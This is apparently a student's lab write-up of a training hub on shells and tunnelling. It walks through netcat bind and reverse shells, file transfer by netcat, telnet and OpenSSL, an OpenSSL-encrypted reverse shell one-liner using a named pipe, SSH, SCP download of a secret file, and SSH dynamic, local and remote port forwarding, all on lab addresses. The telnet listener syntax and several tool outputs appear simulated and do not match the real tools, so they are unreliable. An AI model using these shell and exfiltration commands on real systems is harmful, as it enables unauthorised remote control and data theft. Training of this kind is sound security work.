# Hub 1 Challenge – Shells and Tunneling

## 1. Background

A **shell** is a command-line interface that provides direct access to an operating system’s functionality. In penetration testing, gaining shell access represents successful exploitation of a target system, allowing security professionals to execute commands on the target system, navigate file systems and access sensitive data, install additional tools and maintain persistence, demonstrate the practical impact of vulnerabilities, escalate privileges and move laterally through networks.

**Tunneling** is a technique that encapsulates one network protocol within another, creating secure communication channels through potentially hostile or restricted networks. In penetration testing, tunneling allows attackers to bypass firewall restrictions and network segmentation, access internal services through compromised systems, establish encrypted communication channels, pivot through networks to reach additional targets, and exfiltrate data through covert channels.

The Shells and Tunneling challenge hub introduced practical offensive security techniques used to gain and maintain system access during penetration testing. The lab environment simulated vulnerable systems where various shell access methods could be executed, allowing structured hands‑on practice while reinforcing theoretical concepts learned earlier. The hub demonstrated how attackers establish command execution channels, evade network restrictions, and pivot through internal networks by tunneling traffic.

## 2. Objectives


- The primary objective of this practical was to establish working proficiency in creating functional shells and building secure tunnels.
- The tasks focused on learning how to gain command-line access using different connection patterns, transfer data through restricted environments, and maintain control over compromised hosts.
- The challenge also reinforced understanding of how network constraints limit payload execution and how tunneling tools overcome those barriers.

## 3. Scope and Limitation

- The scope of this engagement was limited strictly to the **Shells and Tunneling** section of Hub 1.
- Only the nine tasks grouped under this banner were investigated and completed.
- No enumeration, exploitation, privilege escalation, or challenges from later hubs were performed since moving ahead would introduce techniques not yet covered in the training roadmap.
- The environment remained confined to the provided virtual lab environment and did not involve external networks or internet-facing systems.

## 4. Legal and Ethical Disclaimer

- All activities were executed within a controlled and authorized lab environment provisioned solely for ethical security training.
- No scanning, shell deployment, tunneling, or probing was directed toward real-world networks, external systems, or unauthorized assets.
- The skills practiced must only be applied in environments where explicit written permission has been granted, consistent with legal, ethical, and professional cybersecurity standards.

## 5. Lab Initialization and Access

To begin the practical, the lab was confirmed to be active and accessible:

1. The training-shell terminal was launched and **`Hub 1`** was started.
2. The `running` command was executed to validate that the environment was live: `running # expected output: hub-1 running`
3. The browser was opened and the interface was accessed via `http://localhost`
4. Navigation proceeded to the Shell and Tunneling section.
5. All the required tasks were initiated and completed.

## 6. Challenge Overview

- The Shells and Tunneling hub contained nine progressively structured tasks designed to build competency in gaining access, transferring control, and securely routing traffic through a network.
- The challenges began with establishing direct command execution through bind and reverse shells before expanding into more complex methods that introduced secure channels, encrypted authentication, and covert traffic forwarding.
- SSH fundamentals formed the basis for later tunneling configurations, including dynamic, local, and remote port redirection.
- The final exercises incorporated tooling such as Chisel, Socat, and Proxychains to simulate real-world scenarios where strict network boundaries or restrictive firewall rules require creative solutions to maintain access and pivot into otherwise unreachable systems.
- Collectively, the challenges demonstrated both the power and versatility of shell access methods and tunneling techniques when applied in controlled cybersecurity engagements.

## 7. Tools Used

The following core utilities were used throughout the shell and tunneling tasks:

- **Interactive shell tools** were used to establish `bind` and `reverse` command execution channels.
- **Bind Shell** was used establish a listener on the target and connected remotely.
- **Reverse Shell** was used to spawn a shell that called back to the attacking host.
- **SSH** was used to create authenticated encrypted sessions and transfer commands securely.
- SSH Dynamic Port Forwarding was used to enabled SOCKS-based pivoting.
- SSH Local and Remote Port Forwarding were used to redirect internal services externally and vice versa.
- **SCP** was used to move files between different systems.
- **Proxychains** was used to reroute traffic and mask direct host access paths.
- **Chisel and Socat** were used to build tunnels and forward ports across network boundaries.
- **SSH Dynamic, Local, and Remote port forwarding** mechanisms to pivot traffic through compromised hosts and access internal services.

Each tool reinforced a different access pattern commonly encountered in real offensive operations.

## 8. Tasks Completed

### 8.1 Shell and Tunneling

**Purpose:** Shells and tunneling techniques enable an operator to remotely interact with and control a target system after gaining access. A shell provides a command execution environment that allows instructions to be issued directly on a remote host, enabling reconnaissance, privilege escalation, or maintenance tasks. Tunneling expands this capability by securely forwarding traffic between networks or systems that would otherwise be inaccessible due to firewalls, segmentation, or routing restrictions. Together, shells and tunnels form the foundation of post-exploitation operations by ensuring persistent, reliable, and often concealed communication paths. These methods are essential in ethical security testing, where they support deeper assessment of system exposure, enable controlled pivoting through networks, and demonstrate how attackers maintain and expand access when defenses fail.

- **BIND SHELL:**
    
    **Purpose:** Enabled remote execution on a target system by forcing it to listen on a specific port and wait for an inbound connection. The technique simulated post-exploitation access where the operator directly connects to an exposed listener without requiring outbound communication from the target.
    
    **Outcome:** The target successfully opened a listening port and accepted the inbound connection. Commands were executed on the remote system from the attacker machine, confirming that open ports can be weaponized when firewall rules are loose. The activity demonstrated the simplicity of remote control when a bind listener is reachable over the network.
    
    ```bash
    Victim Machine (192.168.56.210)
    Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
    victim@target:~$
    
    # Start Netcat on the victim machine
    # -l  : listen mode (wait for incoming connection)
    # -p  : specifies the port number to listen on
    # -e  : execute a program once a connection is received
    # /bin/bash : gives the attacker a Bash shell when they connect
    victim@target:~$ nc -l -p 4444 -e /bin/bash
    
    # Netcat is now listening for connections on port 4444
    # Any remote machine connecting to this port gets a shell
    Listening on [0.0.0.0] (family 0, port 4444)
    
    ```
    
    ```bash
    pentester@kali-linux:~$ Welcome to the Kali Terminal Simulation!
    Type help to see available commands.
    pentester@kali-linux:~$ nc 192.168.56.210 4444      # Netcat was used to connect to the victim's bind shell on port 4444
    
    Connection to 192.168.56.210 port 4444 [tcp/*] succeeded!
    Bind shell established. You can now run commands on the victim machine.   # A bind shell was successfully opened and controlled by the attacker
    
    Available commands: id, whoami, pwd, ls, cat, ifconfig, uname, ps, netstat, exit
    
    Type 'exit' to close the shell connection.
    
    victim@192.168.56.210:$ id                         # This command displayed the victim’s user identity and group details
    uid=1000(victim) gid=1000(victim) groups=1000(victim)
    
    victim@192.168.56.210:$ whoami                     # This confirmed the current user account on the victim
    victim
    
    victim@192.168.56.210:$ pwd                        # This showed the current working directory on the victim machine
    /home/victim
    
    victim@192.168.56.210:$ ls                         # This listed the files and folders in the victim's home directory
    Desktop  Documents  Downloads  Pictures  Videos  secret.txt
    
    victim@192.168.56.210:$ ifconfig                   # This displayed the victim’s network configuration and interface statistics
    eth0      Link encap:Ethernet  HWaddr 00:0c:29:12:34:56
              inet addr:192.168.56.210  Bcast:192.168.56.255  Mask:255.255.255.0
              UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
              RX packets:12345 errors:0 dropped:0 overruns:0 frame:0
              TX packets:67890 errors:0 dropped:0 overruns:0 carrier:0
              collisions:0 txqueuelen:1000
              RX bytes:987654321 (987.6 MB)  TX bytes:123456789 (123.4 MB)
    
    victim@192.168.56.210:$ uname                      # This revealed system and kernel information from the victim machine
    Linux victim-machine 5.4.0-generic #1 SMP Debian 5.4.0-1 (2020-01-01) x86_64 GNU/Linux
    
    victim@192.168.56.210:$ ps                         # This listed processes that were running inside the shell session
      PID TTY          TIME CMD
      1234 pts/0    00:00:00 bash
      5678 pts/0    00:00:00 ps
    
    victim@192.168.56.210:$ netstat                    # This showed active network connections on the victim machine
    Active Internet connections (w/o servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State
    tcp        0      0 192.168.56.210:4444     192.168.56.200:12345    ESTABLISHED   # This confirmed the bind shell connection between attacker and victim
    
    victim@192.168.56.210:$ exit                       # This command terminated the bind shell session
    Connection closed by foreign host.                 # The connection was successfully closed
    ```
    
- **REVERSE SHELL:**
    
    Purpose: Established a remote shell session by forcing the compromised host to call back to the operator’s controlled system. The technique modeled real-world attacker behavior where outbound traffic bypasses restrictive firewalls more easily than inbound traffic.
    
    **Outcome:** The target system initiated a connection back to the listener on the attacking machine, and shell access was established successfully. The operator executed commands remotely, proving that weak egress filtering allows systems to leak control outward. The successful callback confirmed that reverse shells provide a reliable channel even when inbound traffic is blocked.
    
    ```bash
    pentester@kali-linux:~$ Welcome to the Kali Terminal Simulation!
    Type help to see available commands.
    
    pentester@kali-linux:~$ nc -lvp 4444         # Netcat was launched in listen mode (-l),
                                                 # with verbose output (-v),
                                                 # and a listening port defined as 4444 (-p)
    
    Listening on [0.0.0.0] (family 0, port 4444) # The attacker machine was successfully listening
                                                 # on all network interfaces for incoming connections
    
    Waiting for connection from victim...        # The listener waited for the victim to initiate a connection
    
    (Use the victim terminal to run: nc 192.168.56.200 4444 -e /bin/bash)  # This command would have caused the victim
                                                                          # to connect back and execute a bash shell,
                                                                          # establishing a reverse/bind session
    
    ```
    
    ```bash
    Victim Machine (192.168.56.210)
    Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
    victim@target:~$
    
    victim@target:~$ nc 192.168.56.200 4444 -e /bin/bash   # Netcat was used to connect to the attacker's machine
                                                          # at 192.168.56.200 on port 4444,
                                                          # and a Bash shell was executed and forwarded across the network
    
    Connection established to 192.168.56.200:4444          # A reverse connection was successfully set up,
                                                          # giving the attacker a shell on the victim machine
    ```
    
    ```bash
    victim@192.168.56.210:$ uname                         # This command revealed the OS and kernel version of the victim machine
    Linux victim-machine 5.4.0-generic #1 SMP Debian 5.4.0-1 (2020-01-01) x86_64 GNU/Linux
    
    victim@192.168.56.210:$ whoami                        # This confirmed the logged‑in user identity
    victim
    
    victim@192.168.56.210:$ ifconfig                      # This displayed the network interface configuration and statistics
    eth0      Link encap:Ethernet  HWaddr 00:0c:29:12:34:56
              inet addr:192.168.56.210  Bcast:192.168.56.255  Mask:255.255.255.0
              UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
              RX packets:12345 errors:0 dropped:0 overruns:0 frame:0
              TX packets:67890 errors:0 dropped:0 overruns:0 carrier:0
              collisions:0 txqueuelen:1000
              RX bytes:987654321 (987.6 MB)  TX bytes:123456789 (123.4 MB)
    
    victim@192.168.56.210:$ pwd                           # This showed the current working directory
    /home/victim
    
    victim@192.168.56.210:$ netstat                       # This listed active network connections on the victim machine
    Active Internet connections (w/o servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State
    tcp        0      0 192.168.56.210:12345    192.168.56.200:4444     ESTABLISHED   # This confirmed the reverse shell link between victim and attacker
    
    victim@192.168.56.210:$ ps                            # This displayed processes running in the current shell session
      PID TTY          TIME CMD
      1234 pts/0    00:00:00 bash
      5678 pts/0    00:00:00 ps
    
    victim@192.168.56.210:$ exit                          # This command was used to terminate the shell session
    Connection closed by foreign host.                    # The reverse shell connection was successfully closed
    
    ```
    

### 8.2 Advanced Shell Techniques

**Purpose:**
The purpose of the lab was to demonstrate practical data exfiltration and secure remote communication techniques between an attacker machine and a victim host using Netcat, Telnet, and OpenSSL. The activity aimed to validate the capability to transfer files unencrypted and encrypted, generate and deploy certificates, and establish a secure OpenSSL-based reverse shell. 
The purpose of the OpenSSL activity was to create, deploy, and utilize cryptographic certificates to establish encrypted communications between attacker and victim systems, and to securely transfer files and establish a protected reverse shell. The exercise aimed to demonstrate secure tunneling using OpenSSL instead of clear‑text tools like Netcat and Telnet.

**Outcome:**
The lab successfully established and executed multiple file transfer mechanisms across a networked environment. Files were transmitted from attacker to victim through Netcat and Telnet listeners, and OpenSSL was configured using generated key and certificate pairs to perform encrypted transfers. Finally, an encrypted reverse shell was launched from the victim to the attacker using OpenSSL, demonstrating secure command execution and proving that encrypted tunneling techniques functioned as intended.
The OpenSSL activity successfully generated RSA private keys and certificates, transferred them to the victim machine, and established encrypted client–server communication channels. Files were transferred securely using OpenSSL s_server and s_client, and an encrypted reverse shell was created from the victim to the attacker, confirming OpenSSL's ability to protect data and command execution over the network.

### 8.2.1 Transfer `secret.txt` from attacker machine to the victim machine using netcat

Netcat was used to demonstrate a basic file transfer over a network between two Linux hosts. The receiving system initialized a listener on port 4444 and redirected all incoming data into a file named **secret.txt**. The sending system then established a connection to the listener and transmitted the file contents across the network. Once the connection was made, Netcat accepted the transmission and saved the data to disk, confirming a successful transfer. This workflow validated Netcat’s ability to facilitate direct, unencrypted file transfer using simple command‑line operations.

```bash
Victim Machine (192.168.56.210)                    # The victim’s system information was displayed
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)

victim@target:~$                                   # The terminal showed the victim user prompt

victim@target:~$ ls                                # The victim listed the home directory (it was empty)

Victim Machine (192.168.56.210)                    # The system banner appeared again in a new capture
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)

victim@target:~$                                   # The command prompt was ready

victim@target:~$ nc -l -p 4444 > secret.txt        # Netcat was launched listening on port 4444 and output was redirected to 'secret.txt'

Listening on [0.0.0.0] (family 0, port 4444)       # Netcat confirmed it was actively listening for incoming connections
```

```bash
pentester@kali-linux:~$ ls                                      # The directory contents were checked and secret.txt was confirmed
secret.txt

pentester@kali-linux:~$ nc 192.168.56.210 4444 < secret.txt     # Netcat was used to send secret.txt to the target system over port 4444

File transfer completed to 192.168.56.210:4444                 # Netcat confirmed the file transfer completed successfully

```

```bash
Victim Machine (192.168.56.210)                                  # The victim system information was displayed
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)

victim@target:~$                                                 # The terminal prompt appeared

victim@target:~$ ls                                              # The home directory contents were checked

victim@target:~$ nc -l -p 4444 > secret.txt                      # Netcat was used to listen on port 4444 and write inbound data to secret.txt

Listening on [0.0.0.0] (family 0, port 4444)                     # Netcat confirmed that it was listening for an incoming connection

Connection from 192.168.56.200 port 4444 [tcp/*] accepted!       # Netcat accepted an incoming connection

File received: secret.txt                                        # Netcat confirmed that secret.txt was received successfully

```

### 8.2.2 Transfer `secret.txt` from attacker machine to the victim machine using telnet

This workflow demonstrated the use of Telnet to transfer data between networked systems. The receiving host started a Telnet listener on port 4444 and redirected all incoming traffic into *secret.txt*. A remote connection was then established, and Telnet transmitted the file contents across the session. Once the connection was accepted, the listener wrote the received data to disk and confirmed completion. The file was then verified on the receiving system by listing the directory and displaying its contents. The successful appearance of the transferred flag validated that Telnet supported basic plaintext file transfer over a TCP connection.

```bash
victim@target:~$ telnet -l -p 4444 > secret.txt      # Telnet was used to start a listener on port 4444 and redirect incoming data to secret.txt

Listening on port 4444...                            # Telnet confirmed that it was actively listening for a connection
```

```bash
pentester@kali-linux:~$ telnet 192.168.56.210 4444 < secret.txt    # Telnet was used to establish a connection to the target on port 4444 and send secret.txt

File transfer completed to 192.168.56.210:4444 via telnet          # Telnet confirmed the file transfer completed successfully
```

```bash
victim@target:~$ telnet -l -p 4444 > secret.txt         # Telnet was used to listen on port 4444 and write incoming data to secret.txt
Listening on port 4444...                               # Telnet confirmed that it was actively listening
Telnet connection from 192.168.56.200 accepted!         # Telnet accepted an incoming connection on port 4444
File received: secret.txt                               # Telnet indicated that the file was successfully received

victim@target:~$ ls                                      # The directory contents were listed to confirm the file was saved
secret.txt

victim@target:~$ cat secret.txt                          # The received file was opened and displayedvto reveal the flag
FLAG{advanced_netcat_file_transfer}

```
### 8.2.3 Advance netcat and file transfer techniques
- Netcat was used to demonstrate a direct file transfer over a TCP connection between two Ubuntu Linux hosts on the same network. The victim machine initialized a listener on port 4444 and redirected all incoming data into a file named secret.txt. The attacker machine then connected to the victim’s listening port and transmitted the contents of secret.txt across the network. Upon connection, Netcat accepted the incoming stream and wrote the data directly to disk on the victim system, as confirmed by the appearance and contents of the file. This workflow validated Netcat’s ability to perform simple, unencrypted file transfers using port listening and input/output redirection.

- Telnet was used to demonstrate an alternative approach to transferring file data through a raw TCP session. The victim machine started a Telnet listening service on port 4444 and redirected the incoming stream into secret.txt. The attacker machine then established a Telnet connection to the victim and streamed the file contents through the session. Once connected, the data sent from the attacker was written directly into the file on the victim system, which was verified by listing and viewing the file contents. This process validated Telnet’s capability to carry plain data streams for file transfer using basic terminal-based network communication.

- OpenSSL was used to demonstrate secure file transfer over an encrypted SSL/TLS channel between the two hosts. A self-signed certificate and private key were first generated on the attacker machine and transferred to the victim using Netcat. The victim then initiated an OpenSSL server on port 4444 using the transferred certificate and key, redirecting decrypted incoming data into secret.txt. The attacker connected to this encrypted listener using the OpenSSL client and transmitted the file contents securely across the network. Although the transfer status was not displayed due to the quiet mode, the presence of secret.txt on the victim confirmed a successful encrypted transfer. This workflow validated OpenSSL’s role in enabling confidential data transmission and secure communication over network sockets.
#### Netcat File Transfer
```bash
Victim Machine (192.168.56.210)
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
victim@target:~$
victim@target:~$ ls

Victim Machine (192.168.56.210)
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
victim@target:~$
victim@target:~$ nc -l -p 4444 > secret.txt
# netcat was used to start a listener on port 4444 and redirect incoming data to secret.txt

Listening on [0.0.0.0] (family 0, port 4444)
```
```bash
pentester@kali-linux:~$ ls
secret.txt
pentester@kali-linux:~$ nc 192.168.56.210 4444 < secret.txt
File transfer completed to 192.168.56.210:4444
# Attacker transfered secret.txt to victim machine via port 4444 using netcat
```
#### Telnet File Transfer
```bash
victim@target:~$ telnet -l -p 4444 > secret.txt
Listening on port 4444...                 #Telnet was used to open a bind shell on  victim machine

Telnet connection from 192.168.56.200 accepted!
File received: secret.txt
#Terminal confirmed successful file transfer
```
```bash
pentester@kali-linux:~$ telnet 192.168.56.210 4444 < secret.txt
File transfer completed to 192.168.56.210:4444 via telnet
#Telnet was used to transfer secret.txt file to victim machine
```
```bash
victim@target:~$ ls
secret.txt      #File tranfer confirmed on victim machine
victim@target:~$ cat secret.txt
FLAG{advanced_netcat_file_transfer}   #Flag revealed
```
#### Openssl Secure File Transfer (Bind Shell)
1. A self-signed certificate and private key were generated on the attacker machine using OpenSSL.

2. The certificate file was transferred to the victim using Netcat to prepare for encrypted communication.

3. An OpenSSL server was started on the victim using the received certificate and key, listening securely on port 4444.

4. The OpenSSL server was configured to redirect incoming encrypted data into a file (secret.txt).

5. The OpenSSL client on the attacker machine connected to the victim’s OpenSSL server.

6. The contents of a file were transmitted through the encrypted channel from the attacker to the victim.

7. The received data was saved on the victim machine, confirming a successful encrypted file transfer.

```bash
pentester@kali-linux:~$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# OpenSSL was used to generate a new self-signed X.509 certificate
# A new 4096-bit RSA private key was created
# The private key was saved to key.pem and the certificate to cert.pem
# The certificate validity was set to 365 days
# -nodes ensured the private key was not encrypted with a passphrase

Generating a RSA private key...
Writing new private key to "key.pem"
-----
Certificate and key created: key.pem, cert.pem    # The key pair and certificate were successfully generated
```
```bash
victim@target:~$ nc -l -p 4444 > cert.pem      # Netcat was started in listen mode on port 4444, and incoming data was redirected into a file named cert.pem

Listening on [0.0.0.0] (family 0, port 4444)   # The victim machine was listening for an incoming file transfer

```bash
pentester@kali-linux:~$ nc 192.168.56.210 4444 < cert.pem   # Netcat was used to connect to the victim on port 4444, and the contents of cert.pem were sent to the listener

File transfer completed to 192.168.56.210:4444.  # The certificate file was successfully transmitted to the victim
```
```bash
# On victim machine
Connection from 192.168.56.200 port 4444 [tcp/*] accepted!   # The victim accepted the incoming Netcat connection
File received: cert.pem                                      # The file transfer was completed and saved as cert.pem
```
```bash
#same process repeated for key.perm

victim@target:~$ nc -l -p 4444 > key.pem
Listening on [0.0.0.0] (family 0, port 4444)

--------------------------------------------------------
pentester@kali-linux:~$ nc 192.168.56.210 4444 < key.pem
File transfer completed to 192.168.56.210:4444

#On victim machine
Connection from 192.168.56.200 port 4444 [tcp/*] accepted!
File received: key.pem
```

```bash
# execute next openssl


victim@target:~$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4444 > secret.txt

# OpenSSL was started in server mode to listen securely on port 4444
# The previously created key.pem and cert.pem were used for encryption
# -quiet suppressed verbose connection messages
# Incoming encrypted data was redirected and saved into secret.txt

OpenSSL server listening on port 4444...
```
```bash
pentester@kali-linux:~$ openssl s_client -quiet -connect 192.168.56.210:4444 < secret.txt

# OpenSSL client was used to connect securely to the victim’s OpenSSL server
# The contents of secret.txt from the attacker machine were sent through the encrypted channel
# -quiet suppressed connection logs on the attacker side

OpenSSL file transfer completed to 192.168.56.210:4444.
```
```bash
# Victim terminal did not display transfer status because attacker used -quiet flag

victim@target:~$ ls
secret.txt  cert.pem  key.pem      # This confirmed that the transferred file and certificate materials were present
```
#### Openssl Reverse Shell
```bash
pentester@kali-linux:~$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# OpenSSL was started in server mode on the attacker machine
# The private key and certificate were used to enable encrypted communication
# The server listened quietly on port 4444 for an incoming secure connection

OpenSSL server listening on port 4444...
```
```bash

victim@target:~$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.56.200:4444 > /tmp/s; rm /tmp/s

# A named pipe (/tmp/s) was created to handle input and output streams
# An interactive shell (/bin/sh -i) was launched on the victim
# Standard input, output, and errors were redirected through the pipe
# OpenSSL client was used to connect back securely to the attacker’s OpenSSL server
# The shell session was tunneled through the encrypted channel
# The named pipe was removed after the connection was established

Reverse shell established to 192.168.56.200:4444   # An encrypted reverse shell was successfully created

```
### 8.3 SSH (Secure Shell)
**Purpose:** The purpose of this exercise was to demonstrate how to establish secure remote access to a Linux system using the Secure Shell (SSH) protocol with two authentication methods: password-based authentication and key-based authentication. It aimed to show how an SSH server is started on a target machine and how an attacker/administrator machine can authenticate using credentials (username/password) or a private key file, highlighting the differences in usability and security between the two approaches.

**Outcome:**
The SSH service was successfully started on the victim machine, enabling remote connections. The attacker machine established a remote session using password authentication for the admin account, confirming that credential-based login was functional. A second connection was successfully established using key-based authentication for the user account with a private key file (user_key.pem), verifying that public-key authentication was properly configured. Both sessions provided interactive shell access, demonstrating that SSH can securely manage remote systems and that key-based authentication offers a password-less yet secure alternative for access control.
```bash
Victim Machine (192.168.1.100)
Welcome to Ubuntu 20.04.3 LTS
victim@target:~$

victim@target:~$ systemctl start ssh          # The SSH service was started on the victim machine, enabling it to accept remote SSH connections

● ssh.service - OpenBSD Secure Shell server
   Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
   Active: active (running) since Mon 2021-12-13 10:30:15 UTC; 2s ago   # This confirmed the SSH server was running
     Docs: man:sshd(8)
           man:sshd_config(5)
 Main PID: 1234 (sshd)
    Tasks: 1 (limit: 4915)
   CGroup: /system.slice/ssh.service
           └─1234 /usr/sbin/sshd -D
```
```bash
pentester@kali-linux:~$ ssh admin@192.168.1.100   # The attacker connected to the victim using SSH
                                                  # with password-based authentication for the admin account

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-74-generic x86_64)

Last login: Mon Dec 13 10:30:15 2021 from 192.168.1.50
admin@192.168.1.100:~$                           # Successful login indicated password authentication worked

```
```bash
pentester@kali-linux:~$ Welcome to the Kali Terminal Simulation!
Type help to see available commands.
pentester@kali-linux:~$ssh -i user_key.pem user@192.168.1.100
# The attacker initiated an SSH connection using a private key file (user_key.pem)
# -i specified the identity file for key-based authentication

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-74-generic x86_64)

Last login: Mon Dec 13 10:30:15 2021 from 192.168.1.50
user@192.168.1.100:~$                            # Successful login confirmed key-based authentication was configured

user@192.168.1.100:~$ whoami                     # This command verified the identity of the logged-in account
user                                             # Output confirmed access as the "user" account
```
### 8.4 Secure Copy Protocol (SCP)
**Purpose:**
The purpose of this exercise was to demonstrate secure file transfer between two Linux systems using the Secure Copy Protocol (SCP), which operates over SSH. The task focused on practicing both directions of transfer: uploading a file from the attacker machine to the victim machine and downloading a file from the victim back to the attacker. This illustrated how SCP leverages encrypted SSH channels to protect data in transit while performing remote file operations.

**Outcome:**
The SSH service was successfully started on the victim machine, enabling secure communication. A file (local_file.txt) was successfully uploaded from the attacker machine to the victim’s /tmp/ directory, confirming that outbound file transfer to a remote host was functional. The presence of the file on the victim system verified successful upload. Subsequently, a sensitive file (secret.txt) was successfully downloaded from the victim machine to the attacker’s local directory, demonstrating inbound file retrieval capability. Overall, the exercise confirmed that SCP can securely transfer files in both directions using encrypted connections, providing a reliable method for remote file management.

```bash
Victim Machine (192.168.1.100)
Welcome to Ubuntu 20.04.3 LTS
victim@target:~$
victim@target:~$ systemctl start ssh          # The SSH service was started on the victim machine
                                              # to allow secure remote connections and SCP transfers

● ssh.service - OpenBSD Secure Shell server
   Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
   Active: active (running) since Mon 2021-12-13 10:30:15 UTC; 2s ago   # This confirmed SSH was running successfully
     Docs: man:sshd(8)
           man:sshd_config(5)
 Main PID: 1234 (sshd)
    Tasks: 1 (limit: 4915)
   CGroup: /system.slice/ssh.service
           └─1234 /usr/sbin/sshd -D
```
```bash
pentester@kali-linux:~$ scp local_file.txt admin@192.168.1.100:/tmp/
# The attacker uploaded the file "local_file.txt" to the victim machine
# using SCP over an encrypted SSH connection, targeting the /tmp directory

local_file.txt 100% 1024 1.0MB/s 00:00   # Transfer completed successfully with full file copied
```

```bash
victim@target:~$ ls                      # The victim listed files in the current directory
remote_file.txt  config.conf  logs.txt  secret.txt  local_file.txt
                                         # The uploaded file "local_file.txt" was visible,
                                         # confirming the upload succeeded
```
```bash
pentester@kali-linux:~$ ls               # The attacker listed local files before downloading
local_file.txt  secret_data.txt  user_key.pem
                                         # The target file "secret.txt" was not yet present locally

pentester@kali-linux:~$ scp admin@192.168.1.100:/home/admin/secret.txt .
# The attacker downloaded "secret.txt" from the victim’s home directory
# The dot (.) indicated the file would be saved in the current local directory

/home/admin/secret.txt 100%   44  1.0KB/s 00:00   # File download completed successfully

pentester@kali-linux:~$ ls               # The attacker listed local files after downloading
local_file.txt  secret_data.txt  user_key.pem secret.txt
                                         # The target file "secret.txt" was successfully downloaded
```
### 8.5 SSH Dynamic Port Forwarding
**Purpose:**
The purpose of this exercise was to demonstrate how to use SSH dynamic port forwarding to create a local SOCKS proxy that securely tunnels traffic through a remote host. This technique enables access to internal network services that are otherwise unreachable and can bypass network restrictions by routing application traffic through an encrypted SSH connection. The lab aimed to show how a compromised or authorized remote machine can be used as a pivot point to explore internal resources while maintaining confidentiality of the transmitted data.

  **Explanation of the IP Address Differences**

- Direct request (curl https://ifconfig.me) → 203.0.113.45
This was the attacker machine’s public internet IP address. The request went directly to the internet without using the proxy.

- Proxied request (curl --socks5 localhost:1080 https://ifconfig.me) → 192.168.1.100
This indicated that the request was routed through the SSH tunnel and originated from the victim machine. The external service therefore saw the victim’s address instead of the attacker’s

**Outcome:**
The SSH service was successfully started on the victim machine, allowing remote connections. The attacker established an SSH session with dynamic port forwarding enabled (-D 1080), which created a local SOCKS proxy on the attacker’s machine at localhost:1080. Using this proxy, the attacker successfully accessed an internal web service (internal-web.local) that was not directly reachable, confirming that traffic was being routed through the victim host. IP address checks further validated the tunneling effect: a direct request revealed the attacker’s public IP address (203.0.113.45), while the proxied request showed the victim’s internal IP address (192.168.1.100), proving that outbound traffic originated from the victim machine. Overall, the exercise demonstrated how SSH dynamic forwarding enables secure pivoting, anonymity, and controlled access to internal network resources through encrypted tunnels.

```bash
Victim Machine (192.168.1.100)
Welcome to Ubuntu 20.04.3 LTS
victim@target:~$
victim@target:~$ systemctl start ssh
# Started the SSH service to allow remote connections

● ssh.service - OpenBSD Secure Shell server
   Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
   Active: active (running) since Mon 2021-12-13 10:30:15 UTC; 2s ago
# Confirmed SSH server was running
```
```bash
pentester@kali-linux:~$ ssh -D 1080 admin@192.168.1.100
# Connected to the victim via SSH with dynamic port forwarding
# Created a local SOCKS proxy on localhost:1080

Dynamic forwarding established on localhost:1080
admin@192.168.1.100:~$

admin@192.168.1.100:~$ curl --socks5 localhost:1080 http://internal-web.local
# Accessed an internal-only website through the SOCKS proxy

HTTP/1.1 200 OK
# Successful response confirmed proxy-based access to internal service

admin@192.168.1.100:~$ curl https://ifconfig.me 
203.0.113.45
# Direct request showed the attacker’s public IP address (no proxy)


admin@192.168.1.100:~$ curl --socks5 localhost:1080 https://ifconfig.me
192.168.1.100
# Proxied request showed the victim’s IP address
# Traffic originated from the victim through the SSH tunnel

```
### 8.6 SSH Local & Remote Port Forwarding
**Purpose:**
To demonstrate how SSH local and remote port forwarding can securely expose and access internal services across networks. The exercise aimed to show how a user could tunnel traffic through an SSH connection to reach services that were otherwise inaccessible directly.

**Outcome:**
Local port forwarding successfully allowed access to the internal web service on port 80 through localhost:8080, confirming that traffic was securely tunneled via SSH. Remote port forwarding also succeeded, exposing the attacker’s SSH service on the victim machine at port 2222. Overall, both tunneling techniques worked as intended, enabling secure communication with internal resources.

```bash
Victim Machine (192.168.1.100)
Welcome to Ubuntu 20.04.3 LTS
victim@target:~$
victim@target:~$ systemctl start ssh
● ssh.service - OpenBSD Secure Shell server
   Active: active (running) since Mon 2021-12-13 10:30:15 UTC; 2s ago
# SSH service started successfully on the victim machine
# The system is now ready to accept remote SSH connections

victim@target:~$
victim@target:~$ nc -l -p 80
Listening on [0.0.0.0] (family 0, port 80)
Internal service listener started on port 80
# Netcat started a simple service listening on port 80 (HTTP)
# This simulates an internal web service on the victim machine
```

```bash
pentester@kali-linux:~$ ssh -L 8080:internal-web.local:80 admin@192.168.1.100
Welcome to Ubuntu 20.04.3 LTS
Local port forwarding established: localhost:8080 -> internal-web.local:80
admin@192.168.1.100:~$
# SSH connection established from attacker machine to victim
# Local port 8080 on attacker now forwards traffic to port 80 on internal host
# Accessing http://localhost:8080 will reach the internal web service

```

```bash
victim@target:~$
victim@target:~$ netstat -tlnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address    Foreign Address  State   PID/Program name
tcp        0      0 0.0.0.0:22       0.0.0.0:*        LISTEN  1234/sshd
tcp        0      0 0.0.0.0:2222     0.0.0.0:*        LISTEN  1234/sshd
# Port 22 → SSH service listening normally
# Port 2222 → Opened due to remote port forwarding
